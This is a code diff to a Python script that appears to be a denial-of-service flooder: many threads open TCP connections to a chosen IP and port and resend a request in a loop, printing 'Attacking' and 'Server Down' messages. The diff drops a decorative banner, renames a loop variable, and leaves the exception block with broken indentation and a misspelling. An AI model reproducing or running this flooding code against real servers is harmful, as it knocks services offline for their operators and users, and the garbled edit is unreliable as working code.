@@ -25,16 +25,7 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 # CLEAR
-os.system("clear")
-print("")
-print("      🔴    🔴      🔴 🔴       🔴🔴    🔴🔴       🔴🔴            ")
-print("      🔴   🔴     🔴     🔴     🔴 🔴  🔴 🔴     🔴    🔴          ")
-print("      🟠  🟠      🟠     🟠     🟠  🟠🟠  🟠    🟠      🟠         ")
-print("      🟠 🟠       🟠     🟠     🟠   🟠   🟠    🟠      🟠         ")
-print("      🟠  🟠      🟠     🟠     🟠        🟠    🟠🟠🟠🟠🟠         ")
-print("      🔵   🔵     🔵     🔵     🔵        🔵    🔵      🔵         ")
-print("      🔵    🔵      🔵 🔵       🔵        🔵    🔵      🔵         ")              
-print(" ")
+
 print("\033[33m================================================================\033[0m")
 print("\033[92m               use this script for good purpose                       \033[0m")
 print("\033[92m                        design by: Za'99                               \033[0m")
@@ -103,14 +94,14 @@ def start():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
-            for i in range(pack):
+            for i in range(packs):
                 s.send(str.encode(main_req))
-            xx += random.randint(0, int(pack))
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
-        except:
-            s.close()
-            print('[+] Server Down.')
+                xx += random.randint(0, int(packs))
+                print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
 
+       except:
+               s.close()
+            print("[+]Server Doen!.")
 for x in range(thread):
     thred = threading.Thread(target=start)
     thred.start()
